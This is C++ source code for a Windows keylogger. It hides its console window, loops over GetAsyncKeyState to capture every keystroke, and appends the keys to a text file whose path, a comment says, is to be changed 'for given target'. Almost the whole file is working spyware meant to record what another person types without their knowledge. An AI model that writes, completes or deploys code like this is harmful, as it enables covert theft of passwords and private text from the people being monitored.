#include <iostream>
#include <windows.h>
#include <WinUser.h>
#include <fstream>
using namespace std;
void log();
void Stealth();


int main()
{
	Stealth();

	log();
	
	return 0;
	

	
}



void log()
{
	char Key;

	for (;;)
	{
		Sleep(0);
		for (Key = 8; Key <= 222; Key++)
		{
			if (GetAsyncKeyState(Key) == -32767)
			{   //writes the data to the given path. needs to be changed for given target.
				ofstream write("C:\\Users\\amand_000\\Documents\\Visual Studio 2015\\Projects\\Project1\\Record.txt", ios::app);

				//checks if shift key is pressed.
				if (((Key > 64)) && (Key < 91) && !(GetAsyncKeyState(0x10)))//check if the shift key is not pressed.
				{ //if not pessed convert letters to lowercase.
					Key += 32;
					write << Key;//write to file.
					write.close();//close file.
					break;
					//uppercase and lower case are separated in the acii table by a 32 difference.
				}
				else if ((Key > 64) && (Key < 91))//if value within this range...
				{ //if pressed keep uppercase.
					write << Key;
					write.close();
					break;
				}
				else //UK keyboard
				{
					switch (Key)
					{
						case 48:
						{
							if (GetAsyncKeyState(0x10))
								write << ")";
							else
								write << "0";
						}
						break;
						
						case 49: 
	
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << "!";//yes.
							else
								write << "1";//no.
						}
						break;

						case 50:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << "<quatation mark>";//yes.
							else
								write << "2";//no.

						}
						break;

						case 51:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
							write << "£";//yes.
							else
							write << "3";//no.
						}
						break;

						case 52:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << "$";//yes.
							else
								write << "4";//no.
						}
						break;

						case 53:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << "%";//yes.
							else
								write << "5";//no.
						}
						break;

						case 54:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << "^";//yes.
							else
								write << "6";//no.
						}
						break;
						
						case 55:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << "&";//yes.
							else
								write << "7";//no.
						}
						break;

						case 56:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << "*";//yes.
							else
								write << "8";//no.
						}
						break;

						case 57:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << "(";//yes.
							else
								write << "9";//no.
						}
						break;

						case 58:
						{
							if (GetAsyncKeyState(0x10))//is shift being pressed?
								write << ":";//yes.
							else
								write << ";";//no.
						}
						break;


						case VK_SPACE:
							write << " ";

						break;

						case VK_RETURN:
							write << "\n";
						break;
						
						case VK_TAB:
							write << "	";
						break;

						case VK_BACK:
							write << "<BACKSPACE>";
						break;

						case VK_ESCAPE:
							write << "<ESC>";
						break;

						case VK_DELETE:
							write << "<DEL>";
						break;


					}

				}

				



			}
		}
	}
}


void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);

}

